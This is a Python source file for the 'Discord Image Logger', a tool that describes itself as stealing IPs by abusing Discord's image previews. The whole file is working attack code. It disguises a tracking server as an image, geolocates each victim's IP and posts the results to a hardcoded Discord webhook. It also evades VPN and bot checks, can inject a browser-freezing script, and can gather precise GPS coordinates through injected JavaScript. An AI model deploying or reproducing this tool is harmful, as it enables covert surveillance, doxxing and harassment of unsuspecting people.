# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1102483017366253578/pWJSKM3xBS946nZzV829ILCGUK9w9yTBhGMGysPgmT8SCruIgzbRqSplHg8CS8TKdPpU",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
